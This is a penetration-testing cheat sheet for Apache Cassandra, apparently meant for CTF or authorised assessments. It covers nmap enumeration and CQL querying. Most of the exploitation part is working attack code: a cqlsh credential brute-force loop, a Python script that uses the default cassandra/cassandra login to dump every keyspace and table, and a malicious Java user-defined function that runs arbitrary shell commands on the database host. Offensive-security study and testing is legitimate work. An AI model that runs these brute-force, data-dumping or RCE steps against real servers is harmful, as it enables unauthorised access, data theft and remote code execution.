# Port 9042, 9160 - Apache Cassandra

## Table of Contents

- [Enumeration](#enumeration)
- [Connect and Query](#connect-and-query)
- [Exploitation](#exploitation)

---

## Enumeration

### Quick Check (One-liner)

```shell
nmap -p 9042 --script "cassandra-info" $rhost && cqlsh $rhost 9042 -u cassandra -p cassandra -e "DESCRIBE KEYSPACES;"
```

### Nmap

```shell
nmap -sV -sC -p 9042,9160 $rhost
nmap -p 9042 --script "cassandra-info" $rhost
nmap -p 9042 --script "cassandra-brute" $rhost
```

### Port Reference

| Port | Protocol | Description |
| :--- | :--- | :--- |
| 9042 | CQL | Native protocol (Cassandra Query Language) |
| 9160 | Thrift | Legacy Thrift protocol |
| 7000 | Inter-node | Cluster communication |
| 7001 | Inter-node TLS | Secure cluster communication |
| 7199 | JMX | Monitoring |

---

## Connect and Query

### Using cqlsh

```shell
# Connect
cqlsh $rhost 9042

# With authentication
cqlsh $rhost 9042 -u cassandra -p cassandra
```

### Basic CQL Commands

```cql
-- List keyspaces (databases)
DESCRIBE KEYSPACES;

-- Use keyspace
USE keyspace_name;

-- List tables
DESCRIBE TABLES;

-- Describe table
DESCRIBE TABLE table_name;

-- Select data
SELECT * FROM table_name;
SELECT * FROM table_name LIMIT 10;

-- List users
LIST USERS;

-- List roles
LIST ROLES;
```

### Default Credentials

| Username | Password |
| :--- | :--- |
| cassandra | cassandra |

---

## Exploitation

### Dump All Data

```shell
# Connect and enumerate
cqlsh $rhost -u cassandra -p cassandra

# CQL
DESCRIBE KEYSPACES;
USE <keyspace>;
DESCRIBE TABLES;
SELECT * FROM <table>;
```

### Python Script for Data Extraction

```python
#!/usr/bin/env python3
from cassandra.cluster import Cluster
from cassandra.auth import PlainTextAuthProvider

target_host = "TARGET_IP"  # Replace with target
auth = PlainTextAuthProvider(username='cassandra', password='cassandra')
cluster = Cluster([target_host], port=9042, auth_provider=auth)
session = cluster.connect()

# List keyspaces
rows = session.execute("SELECT keyspace_name FROM system_schema.keyspaces")
for row in rows:
    print(f"Keyspace: {row.keyspace_name}")
    
    # List tables in keyspace
    tables = session.execute(
        f"SELECT table_name FROM system_schema.tables WHERE keyspace_name='{row.keyspace_name}'"
    )
    for table in tables:
        print(f"  Table: {table.table_name}")
        
        # Dump data
        try:
            data = session.execute(f"SELECT * FROM {row.keyspace_name}.{table.table_name} LIMIT 100")
            for d in data:
                print(f"    {d}")
        except:
            pass

cluster.shutdown()
```

### Brute Force

```shell
# Nmap
nmap -p 9042 --script "cassandra-brute" \
  --script-args userdb=users.txt,passdb=passwords.txt $rhost

# Custom script
for user in $(cat users.txt); do
  for pass in $(cat passwords.txt); do
    timeout 2 cqlsh $rhost -u "$user" -p "$pass" -e "DESCRIBE KEYSPACES" 2>/dev/null && \
    echo "Found: $user:$pass"
  done
done
```

### UDF Exploitation (if enabled)

```cql
-- Check if user-defined functions are enabled
-- Requires cassandra.yaml: enable_user_defined_functions: true

-- Create malicious UDF for RCE (Java)
CREATE OR REPLACE FUNCTION test.exec(cmd text)
RETURNS NULL ON NULL INPUT
RETURNS text
LANGUAGE java AS $$
  try {
    String[] cmds = {"/bin/bash", "-c", cmd};
    Runtime.getRuntime().exec(cmds);
  } catch (Exception e) {}
  return "done";
$$;

-- Execute
SELECT test.exec('id > /tmp/output') FROM test.table LIMIT 1;
```

---

## Quick Reference

| Command | Description |
| :--- | :--- |
| `cqlsh $rhost 9042` | Connect to Cassandra |
| `cqlsh $rhost -u user -p pass` | Connect with auth |
| `DESCRIBE KEYSPACES;` | List databases |
| `DESCRIBE TABLES;` | List tables |
| `SELECT * FROM table;` | Query data |
| `LIST USERS;` | List users |
